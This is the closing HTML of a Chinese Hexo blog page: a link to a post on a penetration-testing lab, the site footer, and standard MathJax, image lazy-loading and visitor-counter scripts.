href="/2026/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%83%EF%BC%9A%E4%BB%8E%E5%A4%96%E7%BD%91%E5%85%A5%E5%8F%A3%E3%80%81%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%88%B0-AD-%E6%8E%A5%E7%AE%A1%E7%9A%84%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E9%93%BE%E5%A4%8D%E7%9B%98/" title="红日靶场七：从外网入口、容器逃逸到 AD 接管的完整利用链复盘"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%83%EF%BC%9A%E4%BB%8E%E5%A4%96%E7%BD%91%E5%85%A5%E5%8F%A3%E3%80%81%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%88%B0-AD-%E6%8E%A5%E7%AE%A1%E7%9A%84%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E9%93%BE%E5%A4%8D%E7%9B%98/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场七：从外网入口、容器逃逸到 AD 接管的完整利用链复盘"/></a><div class="content"><a class="title" href="/2026/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%83%EF%BC%9A%E4%BB%8E%E5%A4%96%E7%BD%91%E5%85%A5%E5%8F%A3%E3%80%81%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%88%B0-AD-%E6%8E%A5%E7%AE%A1%E7%9A%84%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E9%93%BE%E5%A4%8D%E7%9B%98/" title="红日靶场七：从外网入口、容器逃逸到 AD 接管的完整利用链复盘">红日靶场七：从外网入口、容器逃逸到 AD 接管的完整利用链复盘</a><time datetime="2026-04-11T12:00:00.000Z" title="发表于 2026-04-11 20:00:00">2026-04-11</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 谁把我灯关了</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@4.0.0/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>
